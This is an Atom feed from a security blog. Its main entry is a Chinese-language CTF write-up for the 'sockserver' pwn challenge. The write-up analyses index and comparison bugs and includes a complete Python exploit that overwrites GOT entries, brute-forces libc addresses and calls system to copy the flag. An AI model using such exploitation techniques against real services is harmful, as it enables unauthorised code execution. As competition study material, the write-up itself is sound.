<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Th3S&#39;s Blog</title>
  
  
  <link href="https://the-soloist.github.io/atom.xml" rel="self"/>
  
  <link href="https://the-soloist.github.io/"/>
  <updated>2025-10-29T16:19:15.000Z</updated>
  <id>https://the-soloist.github.io/</id>
  
  <author>
    <name>Th3S</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>第八届“强网”拟态防御国际精英挑战赛 初赛 Write Up</title>
    <link href="https://the-soloist.github.io/2025/10/29/2025-qwnt-quals-wp/"/>
    <id>https://the-soloist.github.io/2025/10/29/2025-qwnt-quals-wp/</id>
    <published>2025-10-29T14:38:28.000Z</published>
    <updated>2025-10-29T16:19:15.000Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，您输入的密码错误，请检查后重新输入。" data-whm="抱歉, 当前文章不能被校验, 不过您还是可以看看解密后的内容。">  <script id="hbeData" type="hbeData" data-hmacdigest="39cae59d2723062b6017a356dfe4b7f76a161e2192009cb257bcc6bc4b15dc35">d07d3f75e1e6def23ee319295dc7742b0c0cbf52cd132de9ffe965d75329d1a7ee18a7dfb1f46e8623f499ff01a11feedaa4e6930ed35ff2548bf1e4a6f6df1160cfa9f61f421358fbb665bf52ba0d3a28f0a6e4b8b93a395105eef0083087c9cae9dd72f6557a1de64522025aee72461f98a7e1d9f29249c06c481ec62828d4aa9aceecd26ef0bf48a045a37235de8a1ec663ba474a60632c5a0addce2728b0fa6f898bf821a635703ab3adf0f484fe7ad6567389ea1e73bbbfc2f93bd788f8f15568439cb168e26e68cfdc1a524f2b12fd074691aa9ff91e5a7bc42c453f77b41da1ba6ce70f7f72554523b08c856b272e2d3b13370c67a52668637f664b67f9fe3f10926ad1ef49c00693ea9948e609f289180b9e65956b39b33e815a15b8df31321b6af94aad98cfa20deb5b1a69145ebcd87b83055b760485b64057ed50672095716312acbace53f92d645cf81c419d52f223fac9deec5da2a52aa9bd469906b3676e00125cc787bfed8a11c692aeada680bc61a0b21c967dcc6231c71d</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Please enter password to read.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Please enter password to read.</summary>
    
    
    
    <category term="Write Up" scheme="https://the-soloist.github.io/category/Write-Up/"/>
    
    
    <category term="CTF" scheme="https://the-soloist.github.io/tag/CTF/"/>
    
  </entry>
  
  <entry>
    <title>第九届“强网杯”全国网络安全挑战赛 初赛 Write Up</title>
    <link href="https://the-soloist.github.io/2025/10/20/2025-qwb-quals-wp/"/>
    <id>https://the-soloist.github.io/2025/10/20/2025-qwb-quals-wp/</id>
    <published>2025-10-19T16:50:23.000Z</published>
    <updated>2025-10-29T16:19:15.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="sockserver"><a href="#sockserver" class="headerlink" title="sockserver"></a>sockserver</h2><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><blockquote><p>函数名是 ai 恢复的，不过不影响看</p></blockquote><p>题目实现了一个 sock server，每接收到一个连接，就会创建对应的 thread，routine 函数是 client_session_thread</p><p><img src="/2025/10/20/2025-qwb-quals-wp/.././2025-qwb-quals-wp/image-20251029235234027.png" alt="image-20251029235234027"></p><p>实现了 5 个功能，add、delete、proxy（6 和 default 没用）。并且题目管理了一个全局的 heap_idx 结构体，用于计算数组的偏移和当前数量。</p><p><img src="/2025/10/20/2025-qwb-quals-wp/.././2025-qwb-quals-wp/image-20251029235240077.png" alt="image-20251029235240077"></p><p><img src="/2025/10/20/2025-qwb-quals-wp/.././2025-qwb-quals-wp/image-20251029235247518.png" alt="image-20251029235247518"></p><h4 id="漏洞一"><a href="#漏洞一" class="headerlink" title="漏洞一"></a>漏洞一</h4><p>漏洞点出在 delete 函数，这里是先<code>--heap_idx-&gt;list_num</code>然后才判断 chunk 是否存在，如果不存在也不会恢复<code>heap_idx-&gt;list_num</code></p><p><img src="/2025/10/20/2025-qwb-quals-wp/.././2025-qwb-quals-wp/image-20251029235413149.png" alt="image-20251029235413149"></p><p>而 add 功能中会先判断<code>heap_idx-&gt;list_num &lt;= 100</code>，然后把 heao 指针保存在<code>heap_list[heap_idx-&gt;list_idx]</code>。</p><p><img src="/2025/10/20/2025-qwb-quals-wp/.././2025-qwb-quals-wp/image-20251029235417050.png" alt="image-20251029235417050"></p><p>那么我们先填满 heap_list，再 delete 的时候释放一个不存在的 chunk，我们就可以实现数组溢出了，看一下 bss 段的内容，相邻的正好是 heap_idx</p><p><img src="/2025/10/20/2025-qwb-quals-wp/.././2025-qwb-quals-wp/image-20251029235421175.png" alt="image-20251029235421175"></p><h4 id="漏洞二"><a href="#漏洞二" class="headerlink" title="漏洞二"></a>漏洞二</h4><p>第二个漏洞回到 main 函数，<code>heap_idx-&gt;index &lt;= 100</code>是有符号比较，检查通过后执行<code>dword_405480[heap_idx-&gt;index - 1] = ++heap_idx-&gt;value</code>，如果<code>heap_idx-&gt;index</code>可控，就可以实现负数溢出</p><p><img src="/2025/10/20/2025-qwb-quals-wp/.././2025-qwb-quals-wp/image-20251029235431849.png" alt="image-20251029235431849"></p><h4 id="漏洞三"><a href="#漏洞三" class="headerlink" title="漏洞三"></a>漏洞三</h4><p>find_chunk 判断 chunk 是否存在，比较方法使用的是 bytes_equal，函数只会匹配到输入数据的长度，并且会被 00 截断</p><p><img src="/2025/10/20/2025-qwb-quals-wp/.././2025-qwb-quals-wp/image-20251029235436249.png" alt="image-20251029235436249"></p><p><img src="/2025/10/20/2025-qwb-quals-wp/.././2025-qwb-quals-wp/image-20251029235438955.png" alt="image-20251029235438955"></p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>利用思路：</p><p>根据上面的分析，我们可以通过漏洞一控制 heao_idx 结构体，然后利用漏洞二实现负数溢出能往 0x405480 之前的地址任意写入（每次 4 字节）。</p><p>0x405480 前面是 got 表，并且题目没有开随机化，所以可以把<code>free@got</code>的地址写入到<code>heap_list[0]</code>中，这样就是利用 find_chunk 爆破 libc 地址</p><p><img src="/2025/10/20/2025-qwb-quals-wp/.././2025-qwb-quals-wp/image-20251029235443520.png" alt="image-20251029235443520"></p><p>拿到 libc 地址后，因为 routine 函数结束的时候也调用了 free，所以不能直接改 free@got</p><p><img src="/2025/10/20/2025-qwb-quals-wp/.././2025-qwb-quals-wp/image-20251029235446858.png" alt="image-20251029235446858"></p><p>proxy 功能的 socks5_handle_connect 函数解析失败的时候会调用 memset 拷贝 error msg，而这个函数没有其他地方调用了，因此可以将 memset@got 改成 system</p><p><img src="/2025/10/20/2025-qwb-quals-wp/.././2025-qwb-quals-wp/image-20251029235450370.png" alt="image-20251029235450370"></p><p><img src="/2025/10/20/2025-qwb-quals-wp/.././2025-qwb-quals-wp/image-20251029235457574.png" alt="image-20251029235457574"></p><p>执行<code>system(&quot;cat /flag &gt; ./web/flag.html&quot;)</code>后，利用 proxy 的功能访问内网端口获取 flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwnkit <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> construct <span class="keyword">import</span> Struct, Switch, Byte, Bytes, Const, this, Pass, Rebuild, len_, Int16ub, Adapter</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">args = init_pwn_args()</span><br><span class="line">binary = ELF(<span class="string">&quot;./sockserver&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>, checksec=<span class="literal">False</span>)</span><br><span class="line">args.info.binary = context.binary = binary</span><br><span class="line">args.info.target = &#123;<span class="string">&quot;host&quot;</span>: args.host, <span class="string">&quot;port&quot;</span>: args.port&#125;</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">port = <span class="number">1080</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot; &gt;&gt;&gt; exploit goes here &lt;&lt;&lt; &quot;&quot;&quot;</span></span><br><span class="line">srv = pwntube(args) <span class="keyword">if</span> <span class="keyword">not</span> args.remote <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Inet4Adapter</span>(<span class="title class_ inherited__">Adapter</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;把 4 字节的 IPv4 与点分十进制字符串互转&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_encode</span>(<span class="params">self, obj, context, path</span>):</span><br><span class="line">        <span class="comment"># 接受 &quot;127.0.0.1&quot; 或 b&quot;\x7f\x00\x00\x01&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(obj, (<span class="built_in">bytes</span>, <span class="built_in">bytearray</span>)):</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">bytes</span>(obj)</span><br><span class="line">        <span class="keyword">return</span> socket.inet_aton(obj)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_decode</span>(<span class="params">self, obj, context, path</span>):</span><br><span class="line">        <span class="keyword">return</span> socket.inet_ntoa(obj)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PackCMD = Struct(</span><br><span class="line">    <span class="string">&quot;magic&quot;</span> / Const(<span class="number">5</span>, Byte),</span><br><span class="line">    <span class="string">&quot;size&quot;</span> / Byte,</span><br><span class="line">    <span class="string">&quot;data&quot;</span> / Byte[this.size],</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">PackConnect = Struct(</span><br><span class="line">    <span class="string">&quot;magic1&quot;</span> / Const(<span class="number">5</span>, Byte),      <span class="comment"># must be 0x05</span></span><br><span class="line">    <span class="string">&quot;magic2&quot;</span> / Const(<span class="number">1</span>, Byte),      <span class="comment"># must be 0x01 CONNECT (your C code checks this)</span></span><br><span class="line">    <span class="string">&quot;magic3&quot;</span> / Const(<span class="number">0</span>, Byte),</span><br><span class="line">    <span class="string">&quot;addr_type&quot;</span> / Byte,</span><br><span class="line">    <span class="string">&quot;bind_addr&quot;</span> / Switch(this.addr_type, &#123;</span><br><span class="line">        <span class="number">1</span>: Struct(                       <span class="comment"># IPv4: 4 bytes addr + 2 bytes port</span></span><br><span class="line">            <span class="string">&quot;ipv4&quot;</span> / Inet4Adapter(Bytes(<span class="number">4</span>)),</span><br><span class="line">            <span class="string">&quot;port&quot;</span> / Int16ub,</span><br><span class="line">        ),</span><br><span class="line">        <span class="number">3</span>: Struct(                       <span class="comment"># DOMAIN: 1-byte len, domain bytes, 2 bytes port</span></span><br><span class="line">            <span class="string">&quot;domain_len&quot;</span> / Rebuild(Byte, len_(this.domain)),</span><br><span class="line">            <span class="string">&quot;domain&quot;</span> / Bytes(this.domain_len),</span><br><span class="line">            <span class="string">&quot;port&quot;</span> / Int16ub,</span><br><span class="line">        ),</span><br><span class="line">    &#125;, default=Pass)  <span class="comment"># 如果遇到其他 addr_type，解析会落在 default（你也可以抛错）</span></span><br><span class="line">)</span><br><span class="line">MSG_0 = <span class="string">b&quot;\x05\x00&quot;</span></span><br><span class="line">MSG_1 = <span class="string">b&quot;\x05\x01&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_cmd</span>(<span class="params">p, cmd</span>):</span><br><span class="line">    p.send(PackCMD.build(&#123;</span><br><span class="line">        <span class="string">&quot;size&quot;</span>: <span class="built_in">len</span>(p8(cmd)),</span><br><span class="line">        <span class="string">&quot;data&quot;</span>: p8(cmd),</span><br><span class="line">    &#125;))</span><br><span class="line">    p.recvuntil(p8(<span class="number">0x05</span>) + p8(cmd))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">p, data</span>):</span><br><span class="line">    send_cmd(p, <span class="number">0x03</span>)</span><br><span class="line">    p.recvuntil(MSG_0)</span><br><span class="line">    p.send(data)</span><br><span class="line">    p.recvuntil(MSG_0)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">p, data</span>):</span><br><span class="line">    send_cmd(p, <span class="number">0x04</span>)</span><br><span class="line">    p.recvuntil(MSG_1)</span><br><span class="line">    p.send(data)</span><br><span class="line">    <span class="comment"># p.recvuntil(MSG_0)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_exit</span>(<span class="params">p</span>):</span><br><span class="line">    send_cmd(p, <span class="number">0x01</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write2addr</span>(<span class="params">p, addr, value</span>):</span><br><span class="line">    offset = ((addr - <span class="number">0x405480</span>) // <span class="number">4</span>) &amp; <span class="number">0xffffffffffffffff</span></span><br><span class="line">    p = remote(host, port)</span><br><span class="line">    payload = p64(<span class="number">0</span>)</span><br><span class="line">    payload += p64(<span class="number">99</span>)</span><br><span class="line">    payload += p64((offset + <span class="number">1</span>) &amp; <span class="number">0xffffffffffffffff</span>)  <span class="comment"># heap_list[0]</span></span><br><span class="line">    payload += p64((value - <span class="number">1</span>) &amp; <span class="number">0xffffffffffffffff</span>)</span><br><span class="line">    add(p, payload)</span><br><span class="line">    p.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clean_idx</span>(<span class="params">p</span>):</span><br><span class="line">    p = remote(host, port)</span><br><span class="line">    payload = p64(<span class="number">0</span>)</span><br><span class="line">    payload += p64(<span class="number">99</span>)</span><br><span class="line">    payload += p64(<span class="number">0</span> + <span class="number">1</span>)</span><br><span class="line">    payload += p64(<span class="number">1</span> - <span class="number">1</span>)</span><br><span class="line">    add(p, payload)</span><br><span class="line">    p.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute_worker</span>(<span class="params">start, end</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">global</span> libc_leak</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(start, end + <span class="number">1</span>):</span><br><span class="line">        <span class="comment"># 检查是否已经有其他线程找到了结果</span></span><br><span class="line">        <span class="keyword">if</span> found_flag.is_set():</span><br><span class="line">            log.info(<span class="string">f&quot;Thread <span class="subst">&#123;threading.current_thread().name&#125;</span> exiting early, result already found&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        p = remote(host, port)</span><br><span class="line">        send_cmd(p, <span class="number">0x05</span>)</span><br><span class="line">        p.recvuntil(MSG_1)</span><br><span class="line">        p.send(libc_leak + p8(i) + <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">        res = p.recv(<span class="number">2</span>)</span><br><span class="line">        p.close()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> res == MSG_0:</span><br><span class="line">            <span class="comment"># 使用锁保护共享变量</span></span><br><span class="line">            <span class="keyword">with</span> found_lock:</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> found_flag.is_set():  <span class="comment"># 双重检查，确保只有一个线程处理结果</span></span><br><span class="line">                    log.success(<span class="string">f&quot;found byte of libc: <span class="subst">&#123;<span class="built_in">hex</span>(i)&#125;</span>&quot;</span>)</span><br><span class="line">                    libc_leak += p8(i)</span><br><span class="line">                    found_flag.<span class="built_in">set</span>()  <span class="comment"># 设置标志，通知其他线程退出</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># fill heap list</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    p = remote(host, port)</span><br><span class="line">    add(p, <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">    p.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># global num-1</span></span><br><span class="line">p = remote(host, port)</span><br><span class="line">delete(p, <span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line">p.close()</span><br><span class="line"></span><br><span class="line"><span class="comment"># write heap_list[0] to free@got</span></span><br><span class="line">write2addr(p, <span class="number">0x405140</span>, <span class="number">0x405018</span> + <span class="number">8</span>)</span><br><span class="line">write2addr(p, <span class="number">0x405144</span>, <span class="number">0</span>)</span><br><span class="line">clean_idx(p)</span><br><span class="line"></span><br><span class="line">libc_leak = <span class="built_in">bytes</span>(<span class="number">0</span>)</span><br><span class="line">found_lock = threading.Lock()</span><br><span class="line">found_flag = threading.Event()  <span class="comment"># 用于通知其他线程退出</span></span><br><span class="line"></span><br><span class="line">THREAD_NUM = <span class="number">15</span></span><br><span class="line">threads = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算每个线程处理的范围</span></span><br><span class="line">total_range = <span class="number">255</span>   <span class="comment"># 1到255，共255个数</span></span><br><span class="line">chunk_size = total_range // THREAD_NUM</span><br><span class="line">remainder = total_range % THREAD_NUM</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    found_flag.clear()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(THREAD_NUM):</span><br><span class="line">        <span class="comment"># 计算当前线程的起始和结束位置</span></span><br><span class="line">        start = <span class="number">1</span> + i * chunk_size + <span class="built_in">min</span>(i, remainder)</span><br><span class="line">        end = start + chunk_size - <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> i &lt; remainder:  <span class="comment"># 前remainder个线程多分配一个数</span></span><br><span class="line">            end += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Thread <span class="subst">&#123;i&#125;</span>: <span class="subst">&#123;start&#125;</span>-<span class="subst">&#123;end&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        thread = threading.Thread(target=brute_worker, args=(start, end), name=<span class="string">f&quot;BruteWorker-<span class="subst">&#123;i&#125;</span>&quot;</span>)</span><br><span class="line">        threads.append(thread)</span><br><span class="line">        thread.start()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 等待所有线程完成，或者等待找到结果</span></span><br><span class="line">    <span class="keyword">for</span> thread <span class="keyword">in</span> threads:</span><br><span class="line">        thread.join()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(libc_leak, <span class="built_in">len</span>(libc_leak))</span><br><span class="line"></span><br><span class="line">libc_leak = uu64(libc_leak)</span><br><span class="line">libc_base = libc_leak - libc.symbols[<span class="string">&quot;free&quot;</span>]</span><br><span class="line">bin_sh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>))</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">plog.address(libc_base=libc_base)</span><br><span class="line"></span><br><span class="line"><span class="comment"># write heap_list[0] to bin_sh_addr</span></span><br><span class="line">write2addr(p, <span class="number">0x405140</span>, bin_sh_addr &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">write2addr(p, <span class="number">0x405140</span> + <span class="number">4</span>, (bin_sh_addr &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">clean_idx(p)</span><br><span class="line"></span><br><span class="line"><span class="comment"># write memset@got to system_addr</span></span><br><span class="line">write2addr(p, <span class="number">0x405058</span>, system_addr &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">write2addr(p, <span class="number">0x405058</span> + <span class="number">4</span>, (system_addr &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">clean_idx(p)</span><br><span class="line"></span><br><span class="line">p = remote(host, port)</span><br><span class="line">send_cmd(p, <span class="number">0x05</span>)</span><br><span class="line">p.recvuntil(MSG_1)</span><br><span class="line">p.send(<span class="string">b&quot;/bin/sh\x00&quot;</span>)  <span class="comment"># for search</span></span><br><span class="line">payload = p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += <span class="string">b&quot;cat /flag &gt; ./web/flag.html&quot;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.close()</span><br><span class="line"></span><br><span class="line">p = remote(host, port)</span><br><span class="line">send_cmd(p, <span class="number">0x05</span>)</span><br><span class="line">p.recvuntil(MSG_1)</span><br><span class="line">p.send(<span class="string">b&quot;/bin/sh\x00&quot;</span>)  <span class="comment"># for search</span></span><br><span class="line">p.send(PackConnect.build(&#123;</span><br><span class="line">    <span class="string">&quot;addr_type&quot;</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="string">&quot;bind_addr&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;ipv4&quot;</span>: <span class="string">&quot;127.0.0.1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;port&quot;</span>: <span class="number">8081</span>,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;))</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">GET /flag.html HTTP/1.1</span></span><br><span class="line"><span class="string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="string">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span></span><br><span class="line"><span class="string">Connection: keep-alive</span></span><br><span class="line"><span class="string">DNT: 1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1:8081</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0</span></span><br><span class="line"><span class="string">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>.strip())</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Pwn&quot;&gt;&lt;a href=&quot;#Pwn&quot; class=&quot;headerlink&quot; title=&quot;Pwn&quot;&gt;&lt;/a&gt;Pwn&lt;/h1&gt;&lt;h2 id=&quot;sockserver&quot;&gt;&lt;a href=&quot;#sockserver&quot; class=&quot;headerlink&quot; title=&quot;s</summary>
      
    
    
    
    <category term="Write Up" scheme="https://the-soloist.github.io/category/Write-Up/"/>
    
    
    <category term="CTF" scheme="https://the-soloist.github.io/tag/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="https://the-soloist.github.io/1901/01/01/hello-world/"/>
    <id>https://the-soloist.github.io/1901/01/01/hello-world/</id>
    <published>1900-12-31T16:00:00.000Z</published>
    <updated>2025-10-29T16:19:15.000Z</updated>
    
